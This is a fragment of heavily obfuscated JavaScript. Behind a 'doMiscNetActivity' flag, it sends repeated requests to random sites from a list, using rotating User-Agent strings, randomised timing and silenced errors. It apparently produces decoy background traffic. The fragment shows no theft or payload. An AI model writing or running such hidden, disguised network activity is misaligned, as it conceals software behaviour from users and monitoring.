    for (let l = -0x2 * 0x539 + -0x997 * -0x1 + 0xdb * 0x1; l < -0x5f * 0x1c + 0x1 * -0x494 + 0xefc; l++)
      setTimeout(f, (0x18068 + -0x5f42 + -0x29 * 0x156) * l * getRandomInt(-0x1d * 0xc2 + -0x16f3 + 0x2cee, 0x48 + 0x25fa + -0x263f));
  }, -0x2c39b4 * -0x1 + -0x3dd05b + -0x29 * -0x1c4cf);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a1 = c;
    f['get'](miscSites[a1(0x13)](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xf70 + 0xd1 * -0x8 + 0x8 * 0x62a) * getRandomInt(-0x1f1 + -0x4fd * 0x2 + -0x4 * -0x2fb, 0x1 * -0x260b + -0x34 * 0x2b + 0x2ecc));
}, -0x22c3 * 0x1 + -0x25d1 + -0x4 * -0x123e);